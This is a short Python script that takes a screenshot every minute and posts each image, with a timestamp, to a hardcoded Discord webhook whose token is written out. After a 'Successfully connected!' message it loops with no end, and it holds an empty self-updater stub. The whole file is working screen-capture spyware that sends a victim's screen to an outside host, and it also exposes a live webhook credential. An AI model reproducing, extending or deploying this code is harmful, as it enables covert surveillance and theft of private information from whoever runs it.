import requests, time, pyautogui, datetime, io

def sendMsg(content, image=""):
  files = {}
  if image:
    # Convert image to appropriate format
    img_byte_arr = io.BytesIO()
    image.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    files = {'file': ('image.png', img_byte_arr, 'image/png')}
  # Send Request
  requests.post("https://discord.com/api/webhooks/1183724561871667210/rumYPqCJ64VTHyJ0PesbYKA-duW2oqeL30SFIwAhXFalK80HNeaScF7gq7PhnK6Jhh7P", data={"content":content}, files=files)

sendMsg("Successfully connected!")

# Main Loop
while True:
  # Send Data
  screenshot = pyautogui.screenshot()
  sendMsg(f"# Update at {str(datetime.datetime.now())}\nScreenshot:", screenshot)

  # Self-Updater
  

  # Sleep
  time.sleep(60)